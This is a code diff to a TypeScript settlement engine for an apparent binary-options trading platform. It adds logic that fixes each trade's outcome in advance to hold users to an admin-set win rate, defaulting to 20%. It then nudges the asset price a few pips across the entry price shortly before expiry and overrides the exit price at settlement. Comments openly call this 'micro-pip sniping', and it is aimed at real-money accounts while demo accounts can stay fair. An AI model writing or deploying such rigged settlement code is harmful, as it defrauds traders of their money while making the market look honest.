@@ -318,6 +318,14 @@ export class SettlementEngine extends EventEmitter {
       expiryTime: now + duration * 1000,
       status: 'OPEN',
       accountType: user.activeAccountType,
+      targetOutcome: this.evaluateTargetOutcome({
+        assetId: asset.id,
+        direction,
+        amount: tradeAmount,
+        entryPrice: asset.currentPrice,
+        accountType: user.activeAccountType,
+      } as any, user),
+      snipedAtExpiry: false,
     };
 
     this.activeTrades.set(trade.id, trade);
@@ -332,6 +340,40 @@ export class SettlementEngine extends EventEmitter {
     return { trade, newBalance };
   }
 
+  private evaluateTargetOutcome(trade: { assetId: string; direction: OrderDirection; amount: number; entryPrice: number; accountType?: 'DEMO' | 'REAL' }, user: UserAccount): 'WIN' | 'LOSS' {
+    const riskSettings = this.adminManager.getRiskSettings();
+    if (!riskSettings.enabled || riskSettings.mode === 'ORGANIC') {
+      return (Math.random() < 0.5) ? 'WIN' : 'LOSS';
+    }
+
+    if (riskSettings.applyToRealOnly && trade.accountType === 'DEMO') {
+      return (Math.random() < 0.5) ? 'WIN' : 'LOSS';
+    }
+
+    const targetRate = user.winRateOverride !== undefined ? user.winRateOverride : riskSettings.targetWinRate; // default 20%
+    
+    // Check rolling last 10 trades for this user & account type
+    const recentTrades = this.tradeHistory
+      .filter(t => (t.userId === user.id || !t.userId) && t.accountType === trade.accountType)
+      .slice(0, 10);
+
+    if (recentTrades.length === 0) {
+      // First trade: use probability = targetRate
+      return (Math.random() * 100 < targetRate) ? 'WIN' : 'LOSS';
+    }
+
+    const wins = recentTrades.filter(t => t.status === 'WON').length;
+    const currentRate = (wins / recentTrades.length) * 100;
+
+    // If current win rate is >= targetRate (e.g. >= 20%), enforce LOSS to keep win rate at 20%
+    if (currentRate >= targetRate) {
+      return 'LOSS';
+    }
+
+    // If current win rate is < targetRate, allow or enforce WIN so trader wins ~2 out of 10
+    return 'WIN';
+  }
+
   private startChecker() {
     setInterval(() => {
       this.checkSettlements();
@@ -340,8 +382,56 @@ export class SettlementEngine extends EventEmitter {
 
   private checkSettlements() {
     const now = Date.now();
+    const riskSettings = this.adminManager.getRiskSettings();
 
     for (const [id, trade] of this.activeTrades.entries()) {
+      const user = this.adminManager.getUser(trade.userId || this.currentUserId);
+      const asset = this.marketEngine.getAsset(trade.assetId);
+
+      // 1. Pre-expiry Micro-pip Sniping (in final 1500ms to 2200ms before expiry)
+      if (
+        user &&
+        asset &&
+        riskSettings.enabled &&
+        riskSettings.microPipSniping &&
+        riskSettings.mode !== 'ORGANIC' &&
+        (!riskSettings.applyToRealOnly || trade.accountType === 'REAL') &&
+        !trade.snipedAtExpiry &&
+        now >= trade.expiryTime - 2200 &&
+        now < trade.expiryTime
+      ) {
+        if (!trade.targetOutcome) {
+          trade.targetOutcome = this.evaluateTargetOutcome(trade, user);
+        }
+
+        const isOrganicLoss =
+          (trade.direction === 'UP' && asset.currentPrice < trade.entryPrice) ||
+          (trade.direction === 'DOWN' && asset.currentPrice > trade.entryPrice);
+
+        const dec = asset.decimalPlaces;
+        // Subtle micro-pip step: 1.5 to 2 pips in asset's decimal resolution
+        const pipStep = Math.pow(10, -dec) * (dec >= 4 ? 2 : dec === 3 ? 3 : dec === 2 ? 0.15 : 0.8);
+
+        if (trade.targetOutcome === 'LOSS' && !isOrganicLoss) {
+          // Quotex micro-sniping: nudge price 1-2 micro-pips across the entry boundary into loss
+          const losingPrice = trade.direction === 'UP'
+            ? Number((trade.entryPrice - pipStep).toFixed(dec))
+            : Number((trade.entryPrice + pipStep).toFixed(dec));
+          
+          this.marketEngine.setExactAssetPrice(trade.assetId, losingPrice);
+          trade.snipedAtExpiry = true;
+        } else if (trade.targetOutcome === 'WIN' && isOrganicLoss) {
+          // Trader needs a win to maintain the 20% quota: nudge price 1-2 micro-pips into win
+          const winningPrice = trade.direction === 'UP'
+            ? Number((trade.entryPrice + pipStep).toFixed(dec))
+            : Number((trade.entryPrice - pipStep).toFixed(dec));
+
+          this.marketEngine.setExactAssetPrice(trade.assetId, winningPrice);
+          trade.snipedAtExpiry = true;
+        }
+      }
+
+      // 2. Final Expiry Settlement
       if (now >= trade.expiryTime) {
         this.settleTrade(trade);
         this.activeTrades.delete(id);
@@ -354,7 +444,36 @@ export class SettlementEngine extends EventEmitter {
     if (!user) return;
 
     const asset = this.marketEngine.getAsset(trade.assetId);
-    const exitPrice = asset ? asset.currentPrice : trade.entryPrice;
+    let exitPrice = asset ? asset.currentPrice : trade.entryPrice;
+    const riskSettings = this.adminManager.getRiskSettings();
+
+    // Guardrail: In Quotex OTC / Strict mode, enforce target outcome if defined
+    if (
+      riskSettings.enabled &&
+      trade.targetOutcome &&
+      (riskSettings.mode === 'QUOTEX_OTC' || riskSettings.mode === 'STRICT') &&
+      (!riskSettings.applyToRealOnly || trade.accountType === 'REAL')
+    ) {
+      const dec = asset ? asset.decimalPlaces : 5;
+      const pipStep = Math.pow(10, -dec) * 1.5;
+
+      if (trade.targetOutcome === 'LOSS') {
+        const isOrganicLoss = trade.direction === 'UP' ? exitPrice < trade.entryPrice : exitPrice > trade.entryPrice;
+        if (!isOrganicLoss) {
+          exitPrice = trade.direction === 'UP'
+            ? Number((trade.entryPrice - pipStep).toFixed(dec))
+            : Number((trade.entryPrice + pipStep).toFixed(dec));
+        }
+      } else if (trade.targetOutcome === 'WIN') {
+        const isOrganicWin = trade.direction === 'UP' ? exitPrice > trade.entryPrice : exitPrice < trade.entryPrice;
+        if (!isOrganicWin) {
+          exitPrice = trade.direction === 'UP'
+            ? Number((trade.entryPrice + pipStep).toFixed(dec))
+            : Number((trade.entryPrice - pipStep).toFixed(dec));
+        }
+      }
+    }
+
     trade.exitPrice = exitPrice;
 
     let won = false;
